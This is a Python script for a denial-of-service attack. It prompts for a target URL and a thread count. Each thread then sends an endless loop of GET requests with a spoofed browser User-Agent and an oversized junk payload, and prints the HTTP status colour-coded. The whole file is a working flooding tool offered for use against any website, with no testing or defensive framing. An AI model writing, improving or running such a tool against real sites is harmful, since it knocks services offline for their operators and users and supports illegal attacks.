from modules.color_text import *
from modules.logo import logo
from modules.excepter import return_error
import os
import threading

try:
   from fake_useragent import UserAgent
except ImportError as err:
   return_error(err)
try:
   import requests
except Exception as err:
   return_error(err)

a = "A" * 9900
b = "B" * 9900
data = {a: b, a: b, a: b, b: a, b: a, a: b, a: b, b: a, a: b, b: a}

logo()

def ddos(target, data):
    while True:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}
            res = requests.get(target, headers=headers, data=data)
            r = str(res.status_code)
            if r[0] == str(1):
               print("[ " + GREY + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
            if r[0] == str(2):
               print("[ " + GREEN + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
            if r[0] == str(3):
               print("[ " + YELLOW + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
            if r[0] == str(4):
               print("[ " + ORANGE + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
            elif r[0] == str(5):
               print("[ " + RED + r + NORMAL + " ] " + YELLOW + " Request sent!" + NORMAL)
        except requests.exceptions.ConnectionError:
            print ("[ " + RED + '!' + NORMAL + " ] " + RED  + "Connection error!" + NORMAL)

url = input("URL: ")

try:
   requests.get(url)
except Exception:
   exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Cannot connect to website!" + NORMAL)

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Threads count is incorrect!")

if threads == 0:
    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Threads count is incorrect!")

if not url.__contains__("http"):
    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "URL doesnt contains http or https!")

if not url.__contains__("."):
    exit("[ " + RED + '!' + NORMAL + " ] " + RED  + "Invalid domain")

for i in range(threads):
    thr = threading.Thread(target=ddos, args=(url, data))
    thr.start()
    #print(str(i + 1) + " thread started!")
